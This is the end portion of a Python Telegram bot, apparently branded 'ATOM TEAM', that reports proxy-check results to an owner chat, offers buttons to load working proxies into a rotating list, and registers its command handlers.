                await context.bot.send_message(
                    chat_id=COMMANDER_ID,
                    text=(
                        f"  ⏳ [{bar}] {to_bold(str(pct))}%\n"
                        f"  📊 {to_bold(str(i+1))}/{to_bold(str(total))}\n"
                        f"  ✅ 𝗔𝗹𝗶𝘃𝗲: {to_bold(str(len(alive)))}\n"
                        f"  ❌ 𝗗𝗲𝗮𝗱: {to_bold(str(dead))}"
                    )
                )
            except:
                pass
    
    result_msg = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "  🔍 𝗣𝗥𝗢𝗫𝗬 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  📊 𝗧𝗼𝘁𝗮𝗹: {to_bold(str(total))}\n"
        f"  ✅ 𝗔𝗹𝗶𝘃𝗲: {to_bold(str(len(alive)))}\n"
        f"  ❌ 𝗗𝗲𝗮𝗱: {to_bold(str(dead))}\n"
        f"  📈 𝗥𝗮𝘁𝗲: {to_bold(f'{len(alive)/max(total,1)*100:.1f}')}%\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "     ⚡ 𝗔𝗧𝗢𝗠 𝗧𝗘𝗔𝗠 ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    #Code_@Midas_ir
    if alive:
        context.user_data['checked_proxies'] = alive
        
        keyboard = [
            [
                InlineKeyboardButton(
                    "✅ بله - ست کن",
                    callback_data="set_proxy_yes"
                ),
                InlineKeyboardButton(
                    "❌ خیر",
                    callback_data="set_proxy_no"
                ),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await context.bot.send_message(
            chat_id=COMMANDER_ID,
            text=result_msg + "\n\n" + "  ❓ آیا میخواهید به عنوان پروکسی ربات ست شوند؟",
            reply_markup=reply_markup
        )
    else:
        await context.bot.send_message(
            chat_id=COMMANDER_ID,
            text=result_msg + "\n\n  ⚠️ 𝗡𝗼 𝗮𝗹𝗶𝘃𝗲 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝗳𝗼𝘂𝗻𝗱!"
        )

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if not is_commander(query.from_user.id):
        return
    
    if query.data == "set_proxy_yes":
        checked = context.user_data.get('checked_proxies', [])
        if checked:
            with proxy_lock:
                proxy_list.clear()
                proxy_list.extend(checked)
            
            await query.edit_message_text(
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  ✅ 𝗣𝗥𝗢𝗫𝗜𝗘𝗦 𝗦𝗘𝗧!\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  🌐 𝗟𝗼𝗮𝗱𝗲𝗱: {to_bold(str(len(checked)))} 𝗽𝗿𝗼𝘅𝗶𝗲𝘀\n"
                "  💀 𝗗𝗲𝗮𝗱 𝗮𝘂𝘁𝗼-𝗿𝗲𝗺𝗼𝘃𝗲: 𝗢𝗡\n"
                "  🔄 𝗔𝘂𝘁𝗼-𝗿𝗼𝘁𝗮𝘁𝗲: 𝗢𝗡\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "     ⚡ 𝗔𝗧𝗢𝗠 𝗧𝗘𝗔𝗠 ⚡\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            add_log(f"🌐 {len(checked)} proxies loaded & set")
        else:
            await query.edit_message_text("⚠️ No proxies to set!")
    
    elif query.data == "set_proxy_no":
        context.user_data.pop('checked_proxies', None)
        await query.edit_message_text(
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "  ❌ 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 𝗻𝗼𝘁 𝘀𝗲𝘁.\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "     ⚡ 𝗔𝗧𝗢𝗠 𝗧𝗘𝗔𝗠 ⚡\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

# ==================== MAIN ====================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("cancell", cancel_cmd))
    app.add_handler(CommandHandler("logs", logs_cmd))
    app.add_handler(CommandHandler("setproxy", setproxy_cmd))
    app.add_handler(CommandHandler("proxychecker", proxychecker_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("     ⚡ ATOM TEAM Bot ⚡")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    app.run_polling()

if __name__ == "__main__":
    main()